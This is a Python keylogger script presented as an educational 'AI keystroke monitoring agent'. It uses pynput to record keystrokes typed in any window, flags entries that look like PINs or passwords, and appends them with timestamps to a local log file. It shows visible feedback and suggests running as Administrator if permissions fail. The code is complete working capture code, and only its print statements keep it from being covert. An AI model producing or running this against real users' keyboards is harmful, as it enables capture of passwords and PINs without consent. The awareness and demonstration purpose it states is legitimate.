"""
AI-Enhanced Keystroke Logging Agent (Test Version with Feedback)
Educational & Cybersecurity Awareness Purpose Only

This version provides visual feedback when keystrokes are captured
"""

from pynput import keyboard
import time
import string
import os

LOG_FILE = "keylog_ai.txt"
buffer = ""
last_time = time.time()

# -------------------------------
# Simple AI / Rule-Based Analyzer
# -------------------------------
def analyze_pattern(text, duration):
    digits = sum(c.isdigit() for c in text)
    symbols = sum(c in string.punctuation for c in text)
    letters = sum(c.isalpha() for c in text)

    if digits >= 4 and letters == 0:
        return "POSSIBLE PIN ENTRY"

    if letters >= 4 and symbols >= 1 and digits >= 1:
        return "POSSIBLE PASSWORD ENTRY"

    if len(text) > 20 and duration < 5:
        return "RAPID TYPING ACTIVITY"

    return "NORMAL INPUT"


# -------------------------------
# Key Capture Callback
# -------------------------------
def on_press(key):
    global buffer, last_time

    try:
        buffer += key.char
        # Visual feedback - show each character captured
        print(f"✓ Captured: {key.char}", end='', flush=True)
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
            print(" [SPACE]", end='', flush=True)
        elif key == keyboard.Key.enter:
            print()  # New line
            now = time.time()
            duration = round(now - last_time, 2)

            classification = analyze_pattern(buffer.strip(), duration)

            log_entry = (
                f"[{time.ctime()}] "
                f"[{classification}] "
                f"[Duration: {duration}s] "
                f"Input: {buffer.strip()}\n"
            )

            # Write to log file
            with open(LOG_FILE, "a") as f:
                f.write(log_entry)
            
            # Print feedback
            print(f"📝 LOGGED: [{classification}] \"{buffer.strip()}\" ({duration}s)")
            print("-" * 60)

            buffer = ""
            last_time = now
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer = buffer[:-1]
            print(" [BKSP]", end='', flush=True)
        elif key == keyboard.Key.esc:
            print("\n\n⚠️  ESC pressed - stopping agent...")
            return False  # Stop listener


# -------------------------------
# Agent Startup
# -------------------------------
print("=" * 70)
print("  AI Keystroke Monitoring Agent STARTED (Test Version)")
print("  Mode: Educational / Awareness")
print("  Logging: Local Only")
print("=" * 70)
print()
print("📌 INSTRUCTIONS:")
print("   1. Switch to ANY other window (Notepad, Browser, VS Code, etc.)")
print("   2. Type some text there")
print("   3. Press ENTER to complete an entry")
print("   4. Come back here to see it was captured!")
print()
print("   💡 Try these patterns:")
print("      - Normal text: 'hello world' [ENTER]")
print("      - PIN-like: '1234' [ENTER]")
print("      - Password-like: 'password123!' [ENTER]")
print()
print("   🛑 Press ESC or CTRL+C to stop")
print("=" * 70)
print()

# Check/create log file
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("")
    print(f"✓ Created new log file: {LOG_FILE}\n")
else:
    print(f"✓ Using existing log file: {LOG_FILE}\n")

print("🎧 Listening for keystrokes... (Type in ANY window)\n")
print("-" * 60)

try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\n\n✓ Agent stopped by user (CTRL+C)")
except Exception as e:
    print(f"\n\n❌ Error: {e}")
    print("\n⚠️  This might be a Windows permission issue.")
    print("   Try running PowerShell as Administrator and run this script again.")

print("\n" + "=" * 70)
print("  Agent stopped. Check keylog_ai.txt for logged entries.")
print("=" * 70)
